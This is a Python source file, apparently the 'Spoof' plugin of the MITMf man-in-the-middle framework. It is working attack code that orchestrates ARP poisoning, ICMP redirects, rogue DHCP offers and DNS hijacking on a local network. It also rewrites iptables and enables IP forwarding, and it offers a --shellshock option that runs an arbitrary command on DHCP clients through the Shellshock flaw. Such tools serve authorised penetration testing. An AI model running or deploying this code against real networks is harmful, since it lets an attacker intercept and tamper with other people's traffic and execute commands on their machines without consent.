#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging

from sys import exit
from core.utils import SystemConfig, IpTables
from core.protocols.arp.ARPpoisoner import ARPpoisoner
from core.protocols.arp.ARPWatch import ARPWatch
from core.dnschef.DNSchef import DNSChef
from core.protocols.dhcp.DHCPServer import DHCPServer
from core.protocols.icmp.ICMPpoisoner import ICMPpoisoner
from plugins.plugin import Plugin
from scapy.all import *

class Spoof(Plugin):
    name        = "Spoof"
    optname     = "spoof"
    desc        = "Redirect/Modify traffic using ICMP, ARP, DHCP or DNS"
    tree_output = list()
    version     = "0.6"
    has_opts    = True

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options           = options
        self.dnscfg            = self.config['MITMf']['DNS']
        self.dhcpcfg           = self.config['Spoof']['DHCP']
        self.targets           = options.targets
        self.manualiptables    = options.manualiptables
        self.mymac             = SystemConfig.getMAC(options.interface)
        self.myip              = SystemConfig.getIP(options.interface)
        self.protocolInstances = []

        #Makes scapy more verbose
        debug = False
        if options.log_level == 'debug':
            debug = True

        if options.arp:

            if not options.gateway:
                exit("[-] --arp argument requires --gateway")

            if options.targets is None:
                #if were poisoning whole subnet, start ARP-Watch
                arpwatch = ARPWatch(options.gateway, self.myip, options.interface)
                arpwatch.debug = debug

                self.tree_output.append("ARPWatch online")
                self.protocolInstances.append(arpwatch)

            arp = ARPpoisoner(options.gateway, options.interface, self.mymac, options.targets)
            arp.arpmode = options.arpmode
            arp.debug = debug

            self.protocolInstances.append(arp)


        elif options.icmp:

            if not options.gateway:
                exit("[-] --icmp argument requires --gateway")

            if not options.targets:
                exit("[-] --icmp argument requires --targets")

            icmp = ICMPpoisoner(options.interface, options.targets, options.gateway, options.ip_address)
            icmp.debug = debug

            self.protocolInstances.append(icmp)

        elif options.dhcp:

            if options.targets:
                exit("[-] --targets argument invalid when DCHP spoofing")

            dhcp = DHCPServer(options.interface, self.dhcpcfg, options.ip_address, options.mac_address)
            dhcp.shellshock = options.shellshock
            dhcp.debug = debug
            self.protocolInstances.append(dhcp)

        if options.dns:

            if not options.manualiptables:
                if IpTables.getInstance().dns is False:
                    IpTables.getInstance().DNS(self.myip, self.dnscfg['port'])

            DNSChef.getInstance().loadRecords(self.dnscfg)

        if not options.arp and not options.icmp and not options.dhcp and not options.dns:
            exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --dns")

        SystemConfig.setIpForwarding(1)

        if not options.manualiptables:
            IpTables.getInstance().Flush()
            if IpTables.getInstance().http is False:
                IpTables.getInstance().HTTP(options.listen)

        for protocol in self.protocolInstances:
            protocol.start()

    def add_options(self, options):
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument('--arp', dest='arp', action='store_true', default=False, help='Redirect traffic using ARP spoofing')
        group.add_argument('--icmp', dest='icmp', action='store_true', default=False, help='Redirect traffic using ICMP redirects')
        group.add_argument('--dhcp', dest='dhcp', action='store_true', default=False, help='Redirect traffic using DHCP offers')
        options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Proxy/Modify DNS queries')
        options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', default=None, help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
        options.add_argument('--targets', dest='targets', default=None, help='Specify host/s to poison [if ommited will default to subnet]')
        options.add_argument('--arpmode',type=str, dest='arpmode', default='rep', choices=["rep", "req"], help=' ARP Spoofing mode: replies (rep) or requests (req) [default: rep]')

    def finish(self):
        for protocol in self.protocolInstances:
            if hasattr(protocol, 'stop'):
                protocol.stop()

        if not self.manualiptables:
            IpTables.getInstance().Flush()

        SystemConfig.setIpForwarding(0)
